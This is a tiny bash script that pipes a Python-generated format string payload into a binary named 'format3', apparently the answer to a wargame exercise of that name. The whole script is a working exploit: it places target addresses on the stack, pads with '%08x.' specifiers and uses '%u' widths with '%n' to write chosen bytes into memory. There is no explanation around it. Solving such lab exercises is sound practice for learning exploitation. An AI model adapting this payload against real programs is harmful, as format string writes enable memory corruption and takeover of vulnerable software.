#!/bin/bash

python -c "print '\xf4\x96\x04\x08'+'%08x.'*10+'%229u+%n+_\xf5\x96\x04\x08'+'%08x.'*14+'%140u+%n+_\xf7\x96\x04\x08'+'%08x.'*19+'%250u+%n+'" | ./format3
